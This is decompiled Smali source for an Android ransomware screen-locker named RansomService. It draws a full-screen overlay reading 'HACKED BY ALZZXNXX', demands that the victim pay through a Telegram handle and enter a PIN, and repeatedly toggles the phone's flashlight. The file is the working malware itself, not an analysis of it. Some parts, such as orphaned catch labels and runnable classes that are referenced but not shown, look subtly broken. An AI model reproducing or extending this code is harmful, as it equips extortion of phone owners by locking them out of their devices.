.class public Lcom/alzz/ransom/RansomService;
.super Landroid/app/Service;
.source "RansomService.java"

.field private flashOn:Z
.field private handler:Landroid/os/Handler;
.field private windowManager:Landroid/view/WindowManager;
.field private lockView:Landroid/widget/LinearLayout;
.field private cameraManager:Landroid/hardware/camera2/CameraManager;
.field private cameraId:Ljava/lang/String;

.method public constructor <init>()V
    .registers 2
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    const/4 v0, 0x0
    iput-boolean v0, p0, Lcom/alzz/ransom/RansomService;->flashOn:Z
    new-instance v0, Landroid/os/Handler;
    invoke-direct {v0}, Landroid/os/Handler;-><init>()V
    iput-object v0, p0, Lcom/alzz/ransom/RansomService;->handler:Landroid/os/Handler;
    return-void
.end method

.method public onCreate()V
    .registers 5
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    
    const-string v0, "window"
    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/view/WindowManager;
    iput-object v0, p0, Lcom/alzz/ransom/RansomService;->windowManager:Landroid/view/WindowManager;
    
    const-string v0, "camera"
    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/hardware/camera2/CameraManager;
    iput-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraManager:Landroid/hardware/camera2/CameraManager;
    
    :try_start_1b
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraManager:Landroid/hardware/camera2/CameraManager;
    invoke-virtual {v0}, Landroid/hardware/camera2/CameraManager;->getCameraIdList()[Ljava/lang/String;
    move-result-object v0
    const/4 v1, 0x0
    aget-object v0, v0, v1
    iput-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraId:Ljava/lang/String;
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_26} :catch_27
    :catch_27
    
    invoke-direct {p0}, Lcom/alzz/ransom/RansomService;->showLockScreen()V
    invoke-direct {p0}, Lcom/alzz/ransom/RansomService;->startRansom()V
    return-void
.end method

.method private showLockScreen()V
    .registers 11
    new-instance v0, Landroid/widget/LinearLayout;
    invoke-direct {v0, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/alzz/ransom/RansomService;->lockView:Landroid/widget/LinearLayout;
    
    const/4 v1, 0x1
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOrientation(I)V
    const/16 v1, 0x11
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setGravity(I)V
    const/high16 v1, -0x1000000
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setBackgroundColor(I)V
    
    const-string v1, "🔥 HACKED BY ALZZXNXX"
    new-instance v2, Landroid/widget/TextView;
    invoke-direct {v2, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    const/high16 v1, -0x10000
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setTextColor(I)V
    const/high16 v1, 0x42000000
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setTextSize(F)V
    invoke-virtual {v0, v2}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V
    
    const-string v1, "TEBUS KE TELEGRAM @alzzisbackv2"
    new-instance v2, Landroid/widget/TextView;
    invoke-direct {v2, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    const v1, -0xcccd
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setTextColor(I)V
    const/high16 v1, 0x41900000
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setTextSize(F)V
    invoke-virtual {v0, v2}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V
    
    const-string v1, "MASUKAN PIN KONTOL !!"
    new-instance v2, Landroid/widget/TextView;
    invoke-direct {v2, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    const v1, -0x999a
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setTextColor(I)V
    const/high16 v1, 0x41600000
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setTextSize(F)V
    invoke-virtual {v0, v2}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V
    
    new-instance v1, Landroid/widget/EditText;
    invoke-direct {v1, p0}, Landroid/widget/EditText;-><init>(Landroid/content/Context;)V
    const/4 v2, 0x0
    invoke-virtual {v1, v2}, Landroid/widget/EditText;->setBackgroundColor(I)V
    const/high16 v3, -0x10000
    invoke-virtual {v1, v3}, Landroid/widget/EditText;->setTextColor(I)V
    const/high16 v3, 0x41c00000
    invoke-virtual {v1, v3}, Landroid/widget/EditText;->setTextSize(F)V
    const/16 v3, 0x11
    invoke-virtual {v1, v3}, Landroid/widget/EditText;->setGravity(I)V
    const/4 v3, 0x6
    invoke-virtual {v1, v3}, Landroid/widget/EditText;->setInputType(I)V
    const/4 v3, 0x6
    invoke-virtual {v1, v3}, Landroid/widget/EditText;->setMaxEms(I)V
    const/16 v3, 0x6e
    invoke-virtual {v1, v3}, Landroid/widget/EditText;->setEms(I)V
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V
    
    new-instance v1, Landroid/widget/Button;
    invoke-direct {v1, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V
    const-string v3, "UNLOCK"
    invoke-virtual {v1, v3}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V
    const/4 v3, -0x1
    invoke-virtual {v1, v3}, Landroid/widget/Button;->setTextColor(I)V
    const/high16 v3, -0x10000
    invoke-virtual {v1, v3}, Landroid/widget/Button;->setBackgroundColor(I)V
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V
    
    new-instance v1, Landroid/view/WindowManager$LayoutParams;
    const/4 v3, -0x1
    const/4 v4, -0x1
    const/16 v5, 0x7f6
    const v6, 0x80028
    const/4 v7, -0x3
    invoke-direct {v1, v3, v4, v5, v6, v7}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V
    
    const/16 v3, 0x31
    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I
    
    const/16 v3, 0x7d6
    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->type:I
    
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v4, 0x1a
    if-lt v3, v4, :cond_95
    const/16 v3, 0x7f6
    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->type:I
    :cond_95
    
    iget-object v3, p0, Lcom/alzz/ransom/RansomService;->windowManager:Landroid/view/WindowManager;
    invoke-interface {v3, v0, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    return-void
.end method

.method private startRansom()V
    .registers 9
    new-instance v0, Lcom/alzz/ransom/RansomService$1;
    invoke-direct {v0, p0}, Lcom/alzz/ransom/RansomService$1;-><init>(Lcom/alzz/ransom/RansomService;)V
    
    const-wide/16 v1, 0x1f4
    iget-object v3, p0, Lcom/alzz/ransom/RansomService;->handler:Landroid/os/Handler;
    invoke-virtual {v3, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    
    new-instance v0, Lcom/alzz/ransom/RansomService$2;
    invoke-direct {v0, p0}, Lcom/alzz/ransom/RansomService$2;-><init>(Lcom/alzz/ransom/RansomService;)V
    
    const-wide/16 v1, 0x3e8
    iget-object v3, p0, Lcom/alzz/ransom/RansomService;->handler:Landroid/os/Handler;
    invoke-virtual {v3, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    
    new-instance v0, Lcom/alzz/ransom/RansomService$3;
    invoke-direct {v0, p0}, Lcom/alzz/ransom/RansomService$3;-><init>(Lcom/alzz/ransom/RansomService;)V
    
    const-wide/16 v1, 0x1388
    iget-object v3, p0, Lcom/alzz/ransom/RansomService;->handler:Landroid/os/Handler;
    invoke-virtual {v3, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    return-void
.end method

.method private toggleFlash()V
    .registers 6
    :try_start_0
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraManager:Landroid/hardware/camera2/CameraManager;
    if-eqz v0, :cond_1e
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraId:Ljava/lang/String;
    if-eqz v0, :cond_1e
    iget-boolean v0, p0, Lcom/alzz/ransom/RansomService;->flashOn:Z
    if-eqz v0, :cond_10
    
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraManager:Landroid/hardware/camera2/CameraManager;
    iget-object v1, p0, Lcom/alzz/ransom/RansomService;->cameraId:Ljava/lang/String;
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2}, Landroid/hardware/camera2/CameraManager;->setTorchMode(Ljava/lang/String;Z)V
    goto :goto_16
    
    :cond_10
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraManager:Landroid/hardware/camera2/CameraManager;
    iget-object v1, p0, Lcom/alzz/ransom/RansomService;->cameraId:Ljava/lang/String;
    const/4 v2, 0x1
    invoke-virtual {v0, v1, v2}, Landroid/hardware/camera2/CameraManager;->setTorchMode(Ljava/lang/String;Z)V
    :goto_16
    iget-boolean v0, p0, Lcom/alzz/ransom/RansomService;->flashOn:Z
    if-eqz v0, :cond_1e
    const/4 v0, 0x0
    goto :goto_1f
    :cond_1e
    const/4 v0, 0x1
    :goto_1f
    iput-boolean v0, p0, Lcom/alzz/ransom/RansomService;->flashOn:Z
    :catch_21
    :cond_21
    return-void
.end method

.method public onDestroy()V
    .registers 4
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
    
    :try_start_3
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraManager:Landroid/hardware/camera2/CameraManager;
    if-eqz v0, :cond_14
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraId:Ljava/lang/String;
    if-eqz v0, :cond_14
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->cameraManager:Landroid/hardware/camera2/CameraManager;
    iget-object v1, p0, Lcom/alzz/ransom/RansomService;->cameraId:Ljava/lang/String;
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2}, Landroid/hardware/camera2/CameraManager;->setTorchMode(Ljava/lang/String;Z)V
    :cond_14
    :goto_14
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->lockView:Landroid/widget/LinearLayout;
    if-eqz v0, :cond_27
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->windowManager:Landroid/view/WindowManager;
    if-eqz v0, :cond_27
    iget-object v0, p0, Lcom/alzz/ransom/RansomService;->windowManager:Landroid/view/WindowManager;
    iget-object v1, p0, Lcom/alzz/ransom/RansomService;->lockView:Landroid/widget/LinearLayout;
    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
    :cond_27
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    const/4 v0, 0x0
    return-object v0
.end method
